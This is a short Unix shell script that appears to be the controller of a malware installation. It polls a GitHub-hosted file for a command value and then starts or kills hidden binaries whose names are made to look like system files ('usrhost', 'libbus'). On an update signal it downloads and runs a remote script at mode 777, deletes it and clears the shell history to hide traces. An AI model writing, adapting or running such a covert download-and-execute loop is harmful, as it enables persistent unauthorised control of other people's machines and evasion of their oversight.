#! /bin/sh

wget https://raw.githubusercontent.com/myvulweb/b1/master/1.txt -O /tmp/b1-singal-test.txt
ret=`cat /tmp/b1-singal-test.txt`
rm -rf /tmp/b1-singal-test.txt

cur_ver=`cat /usr/bin/usrhost_ver.txt`
echo $cur_ver
echo $ret
if [ "$ret" -eq 1 ]
then
	echo "start"
	if [ `ps -ef|grep /usr/bin/usrhost | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started usrhost"
	else
		echo "need to start usrhost"
		/usr/bin/usrhost &
	fi

	if [ `ps -ef|grep /usr/bin/libbus | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started libbus"
	else
		echo "need to start libbus"
		/usr/bin/libbus &
	fi

elif [ "$ret" -eq 0 ]
then
	echo "need to stop all"
	killall usrhost
	killall libbus
elif [ "$ret" -gt "$cur_ver" ]
then
	echo "need to update"
	wget https://raw.githubusercontent.com/myvulweb/b1/master/in.sh -O /tmp/b1-in.sh
	chmod 777 /tmp/b1-in.sh
	/tmp/b1-in.sh
	rm -rf /tmp/b1-in.sh
	history -c

else
	echo "not defined!"
fi


